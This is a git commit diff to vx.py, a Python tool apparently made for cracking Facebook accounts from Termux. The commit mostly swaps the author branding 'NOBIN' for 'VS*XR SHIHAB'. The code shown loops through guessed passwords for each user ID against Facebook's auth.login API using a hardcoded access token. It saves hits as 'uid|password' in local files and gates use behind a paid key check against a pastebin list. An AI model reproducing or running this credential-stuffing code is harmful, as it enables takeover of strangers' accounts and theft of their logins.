3d6a3f3d0f37040b9b522d610890e8905077d8b0
XR-SHIHAB-999 <141644163+XR-SHIHAB-999@users.noreply.github.com>
2024-02-22 01:22:29 +0600

    Update vx.py

--- vx.py
+++ vx.py
@@ -1265,7 +1265,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [NOBIN  ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [VS*XR SHIHAB  ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1282,15 +1282,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ NOBIN -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ VS*XR SHIHAB -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-NOBIN -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-VS*XR SHIHAB -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ NOBIN -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ VS*XR SHIHAB -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-NOBIN -OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-VS*XR SHIHAB -OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1299,7 +1299,7 @@ class Main:
  
  
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrNOBIN -cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.mrVS*XR SHIHAB -cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://pastebin.com/p3jbWM14").text
@@ -1315,14 +1315,14 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m NOBIN  Toll Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m VS*XR SHIHAB  Toll Paid You Need Get Approved First\033[1;37m\n")
 		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
 		print(" Copy And Send Key To Admin")
 		print ("")
-		print (" Your Key : "+ak+NOBIN +key1)
+		print (" Your Key : "+ak+ VS*XR SHIHAB +key1)
 		print ("")
 		name = input(" Your Name : ")
 		print ("")
